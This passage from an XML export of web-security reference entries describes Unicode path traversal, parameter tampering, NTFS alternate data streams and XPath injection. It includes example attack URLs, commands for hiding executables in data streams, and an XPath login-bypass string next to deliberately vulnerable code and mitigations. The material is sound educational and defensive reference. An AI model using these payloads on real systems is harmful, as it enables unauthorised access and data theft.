    <example>Consider a web application which has restricted directories or files (e.g. a file containing application usernames: appusers.txt). An attacker can encode the character sequence “../” ([[Path Traversal]] Attack) using Unicode format and attempt to access the protected resource, as follows:

Original Path Traversal attack URL (without Unicode Encoding):

 &lt;nowiki&gt;http://vulneapplication/../../appusers.txt&lt;/nowiki&gt;

Path Traversal attack URL with Unicode Encoding:

 &lt;nowiki&gt;http://vulneapplication/%C0AE%C0AE%C0AF%C0AE%C0AE%C0AFappusers.txt&lt;/nowiki&gt;

The Unicode encoding for the URL above will produce the same result as the first URL (Path Traversal Attack). However, if the application has an input security filter mechanism, it could refuse any request containing “../” sequence, thus blocking the attack. However, if this mechanism doesn’t consider character encoding, the attacker can bypass and access protected resource.

Other consequences of this type of attack are privilege escalation, arbitrary code execution, data modification, and denial of service.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Web Parameter Tampering</name>
    <description>The Web Parameter Tampering attack is based on the manipulation of parameters exchanged between client and server in order to modify application data, such as user credentials and permissions, price and quantity of products, etc. Usually, this information is stored in cookies, hidden form fields, or URL Query Strings, and is used to increase application functionality and control.

This attack can be performed by a malicious user who wants to exploit the application for their own benefit, or an attacker who wishes to attack a third-person using a [[Man-in-the-middle attack]]. In both cases, tools likes Webscarab and Paros proxy are mostly used.

The attack success depends on integrity and logic validation mechanism errors, and its exploitation can result in other consequences including [[Cross-site Scripting (XSS)|XSS]], [[SQL Injection]], file inclusion, and path disclosure attacks.

For a short video clip describing the vulnerability, [http://www.youtube.com/watch?v=l5LCDEDn7FY&amp;hd=1 click here] (Courtesy of [http://www.checkmarx.com/ Checkmarx])</description>
    <environment />
    <example>=== Example 1===

The parameter modification of form fields can be considered a typical example of Web Parameter Tampering attack. 

For example, consider a user who can select form field values (combo box, check box, etc.) on an application page. When these values are submitted by the user, they could be acquired and arbitrarily manipulated by an attacker.

=== Example 2===

When a web application uses hidden fields to store status information, a malicious user can tamper with the values stored on his browser and change the referred information. For example, an e-commerce shopping site uses hidden fields to refer to its items, as follows:

 &lt;input type=”hidden” id=”1008” name=”cost” value=”70.00”&gt;

In this example, an attacker can modify the “value” information of a specific item, thus lowering its cost.

=== Example 3===

An attacker can tamper with URL parameters directly. For example, consider a web application that permits a user to select his profile from a combo box and debit the account:

 &lt;nowiki&gt;http://www.attackbank.com/default.asp?profile=741&amp;debit=1000&lt;/nowiki&gt;

In this case, an attacker could tamper with the URL, using other values for profile and debit:

 &lt;nowiki&gt;http://www.attackbank.com/default.asp?profile=852&amp;debit=2000&lt;/nowiki&gt;

Other parameters can be changed including attribute parameters. In the following example, it’s possible to tamper with the status variable and delete a page from the server:

 &lt;nowiki&gt;http://www.attackbank.com/savepage.asp?nr=147&amp;status=read&lt;/nowiki&gt;

Modifying the status variable to delete the page:

 &lt;nowiki&gt;http://www.attackbank.com/savepage.asp?nr=147&amp;status=del&lt;/nowiki&gt;
</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>Windows ::DATA alternate data stream</name>
    <description>The NTFS file system includes support for alternate data streams.  This is not a well known feature and was included, primarily, to provide compatibility with files in the Macintosh file system.  Alternate data streams allow files to contain more than one stream of data.  Every file has at least one data stream.  In Windows, this default data stream is called :$DATA.

Windows Explorer doesn't provide a way of seing what alternate data streams are in a file (or a way to remove them without deleting the file) but they can be created and accessed easily.  Because they are difficult to find they are often used by hackers to hide files on machines that they've compromised (perhaps files for a rootkit).  Executables in alternate data streams can be executed from the command line but they will not show up in Windows Explorer (or the Console).  Reference Example 1 for information on creating and accessing alternate data streams.

Since the :$DATA alternate stream exists for every file it can be an alternate way to access any file.  Reference Example 2 for information on accessing the :$DATA alternate data stream in a text file.  Any application that creates files or looks at or depends on the end of the file name (or the extension) should be aware of the possibility of these alternate data streams.  If unsanitized user input is used to create or reference a file name an attacker could use the :$DATA stream to change the behavior of the software.  A well-known vulnerability of this nature existed in older versions of IIS.  When IIS saw a request for a file with an ASP extension it sent the ASP file to the application associated with the extension.  This application would run the server-side code in the ASP file and generate the HTML response for the request.  Due to a flaw in the extension parsing of these versions of IIS, filename.asp::$DATA did not match the extension and since there was no application registered for the asp::$DATA extension, the asp source code was returned to the attacker.

Proper user input sanitation is the best defense against this type of attack.</description>
    <environment />
    <example>===Example 1 - Creating Alternate Data Streams===
&lt;pre&gt;
C:\&gt; type C:\windows\system32\notepad.exe &gt; c:\windows\system32\calc.exe:notepad.exe
C:\&gt; start c:\windows\system32\calc.exe:notepad.exe
&lt;/pre&gt;

===Example 2 - Accessing the :$DATA Alternate Data Stream===
&lt;pre&gt;
C:\&gt; start c:\textfile.txt::$DATA
&lt;/pre&gt;

===Example 3 - Exploiting the ASP Alternate Data Stream Show Code Vulnerability===
&lt;pre&gt;
Normal access:
    http://www.alternate-data-streams.com/default.asp

Show code bypass accessing the :$DATA alternate data stream:
    http://www.alternate-data-streams.com/default.asp::$DATA
&lt;/pre&gt;
In the vulnerable versions, IIS parsed the extension of this file as asp::$DATA, not ASP.  As such the application associated with the ASP extension was not invoked and the ASP source code was viewable by the attacker.</example>
    <determination />
    <protection />
  </vul>
  <vul>
    <name>XPATH Injection</name>
    <description>Similar to [[SQL Injection]], XPath Injection attacks occur when a web site uses user-supplied information to construct an XPath query for XML data.  By sending intentionally malformed information into the web site, an attacker can find out how the XML data is structured, or access data that he may not normally have access to.  He may even be able to elevate his privileges on the web site if the XML data is being used for authentication (such as an XML based user file).

Querying XML is done with XPath, a type of simple descriptive statement that allows the XML query to locate a piece of information.  Like SQL, you can specify certain attributes to find, and patterns to match.  When using XML for a web site it is common to accept some form of input on the query string to identify the content to locate and display on the page.  This input '''must''' be sanitized to verify that it doesn't mess up the XPath query and return the wrong data.

XPath is a standard language; its notation/syntax is always implementation independent, which means the attack may be automated.
There are no different dialects as it takes place in requests to the SQL databeses.

Because there is no level access control it's possible to get the entire document. We won't encounter any limitations as we may know from SQL injection attacks.</description>
    <environment />
    <example>We'll use this XML snippet for the examples.

&lt;pre&gt;
&amp;lt;?xml version="1.0" encoding="utf-8"?&amp;gt;
&amp;lt;Employees&amp;gt;
   &amp;lt;Employee ID="1"&amp;gt;
      &amp;lt;FirstName&amp;gt;Arnold&amp;lt;/FirstName&amp;gt;
      &amp;lt;LastName&amp;gt;Baker&amp;lt;/LastName&amp;gt;
      &amp;lt;UserName&amp;gt;ABaker&amp;lt;/UserName&amp;gt;
      &amp;lt;Password&amp;gt;SoSecret&amp;lt;/Password&amp;gt;
      &amp;lt;Type&amp;gt;Admin&amp;lt;/Type&amp;gt;
   &amp;lt;/Employee&amp;gt;
   &amp;lt;Employee ID="2"&amp;gt;
      &amp;lt;FirstName&amp;gt;Peter&amp;lt;/FirstName&amp;gt;
      &amp;lt;LastName&amp;gt;Pan&amp;lt;/LastName&amp;gt;
      &amp;lt;UserName&amp;gt;PPan&amp;lt;/UserName&amp;gt;
      &amp;lt;Password&amp;gt;NotTelling&amp;lt;/Password&amp;gt;
      &amp;lt;Type&amp;gt;User&amp;lt;/Type&amp;gt;
   &amp;lt;/Employee&amp;gt;
&amp;lt;/Employees&amp;gt;
&lt;/pre&gt;

Suppose we have a user authentication system on a web page that used a data file of this sort to login users.  Once a username and password have been supplied the software might use XPath to look up the user:

&lt;pre&gt;
VB:
Dim FindUserXPath as String
FindUserXPath = "//Employee[UserName/text()='" &amp; Request("Username") &amp; "' And 
        Password/text()='" &amp; Request("Password") &amp; "']"

C#:
String FindUserXPath;
FindUserXPath = "//Employee[UserName/text()='" + Request("Username") + "' And 
        Password/text()='" + Request("Password") + "']";
&lt;/pre&gt;

With a normal username and password this XPath would work, but an attacker may send a bad username and password and get an XML node selected without knowing the username or password, like this:

&lt;pre&gt;
Username: blah' or 1=1 or 'a'='a
Password: blah

FindUserXPath becomes //Employee[UserName/text()='blah' or 1=1 or 
        'a'='a' And Password/text()='blah']

Logically this is equivalent to:
        //Employee[(UserName/text()='blah' or 1=1) or 
        ('a'='a' And Password/text()='blah')]
&lt;/pre&gt;

In this case, only the first part of the XPath needs to be true.  The password part becomes irrelevant, and the UserName part will match ALL employees because of the "1=1" part.</example>
    <determination />
    <protection>Just like the techniques to avoid SQL injection, you need to use a parameterized XPath interface if one is available, or escape the user input to make it safe to include in a dynamically constructed query. If you are using quotes to terminate untrusted input in a dynamically constructed XPath query, then you need to escape that quote in the untrusted input to ensure the untrusted data can't try to break out of that quoted context. In the following example, single quotes (') are used to terminate the Username and Password parameters. So, we need to replace any ' characters in this input with the XML encoded version of that character, which is "&amp;amp;apos;".  

&lt;pre&gt;
VB:
Dim FindUserXPath as String
FindUserXPath = "//Employee[UserName/text()='" &amp; Request("Username").Replace("'", "&amp;amp;apos;") &amp; "' And 
        Password/text()='" &amp; Request("Password").Replace("'", "&amp;amp;apos;") &amp; "']"

C#:
String FindUserXPath;
FindUserXPath = "//Employee[UserName/text()='" + Request("Username").Replace("'", "&amp;amp;apos;") + "' And 
        Password/text()='" + Request("Password").Replace("'", "&amp;amp;apos;") + "']";
&lt;/pre&gt;

Another &lt;strong&gt;better&lt;/strong&gt; mitigation option is to use a precompiled XPath[http://www.tkachenko.com/blog/archives/000385.html] query.  Precompiled XPath queries are already preset before the program executes, rather than created on the fly &lt;strong&gt;after&lt;/strong&gt; the user's input has been added to the string.  This is a better route because you don't have to worry about missing a character that should have been escaped.</protection>
  </vul>
</vulcategories>